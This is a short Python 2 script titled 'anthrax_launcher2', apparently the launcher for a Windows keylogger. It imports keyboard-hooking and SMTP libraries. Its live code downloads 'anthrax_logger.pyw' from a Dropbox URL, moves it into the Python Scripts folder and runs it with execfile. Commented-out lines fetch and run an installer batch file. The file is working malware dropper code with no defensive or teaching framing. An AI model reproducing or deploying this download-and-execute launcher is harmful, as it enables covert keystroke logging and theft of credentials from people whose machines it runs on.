#anthrax_launcher2 1.2
#config--------------------
#subject_name = 'debug4.1'
#subject_file = 'C://Python27/name.txt'
#interval = 500
#crypt_key = 69
#--------------------------
import pyHook, pythoncom, sys, logging, os, smtplib, socket, getpass, time
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import Encoders
import sched
import urllib2, urllib, shutil
from win32com.shell import shell, shellcon
import subprocess
#--------------------------
#f = open(subject_file,'w')
#f.write(subject_name)
#f.close()
#f = open(subject_file,'r')
#r = f.read()
#f.close()
#print r
#--------------------------
url_c = "https://dl.dropboxusercontent.com/u/42966918/anthrax/anthrax_logger/anthrax_logger.pyw?dl=1" 
print 'Gathering anthrax_logger...',
c = urllib.URLopener()
c.retrieve(url_c, "anthrax_logger.pyw")
shutil.move("anthrax_logger.pyw", "C://Python27/Scripts/anthrax_logger.pyw")
print 'Done'
#print 'Gathering installer...',
#b = urllib.URLopener()
#b.retrieve(url_b, "mv.bat")
#print 'Done'
#print 'Installing the chin...',
#p = Popen("mv.bat")
#stdout, stderr = p.communicate()
#print 'Done'
print 'Starting anthrax_logger...',
execfile("C://Python27//Scripts/anthrax_logger.pyw")
print 'Done'
